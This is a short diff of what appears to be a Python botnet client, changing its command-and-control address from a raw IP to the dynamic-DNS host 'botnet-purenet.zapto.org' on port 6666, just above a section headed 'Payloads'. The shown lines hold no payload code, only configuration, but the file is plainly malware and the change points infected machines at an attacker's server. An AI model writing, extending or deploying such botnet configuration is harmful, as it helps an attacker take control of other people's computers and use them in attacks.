@@ -5,7 +5,7 @@ import os
 import random
 
 # Configuration
-C2_ADDRESS = "41.141.104.161"
+C2_ADDRESS = "botnet-purenet.zapto.org"
 C2_PORT = 6666
 
 # Payloads
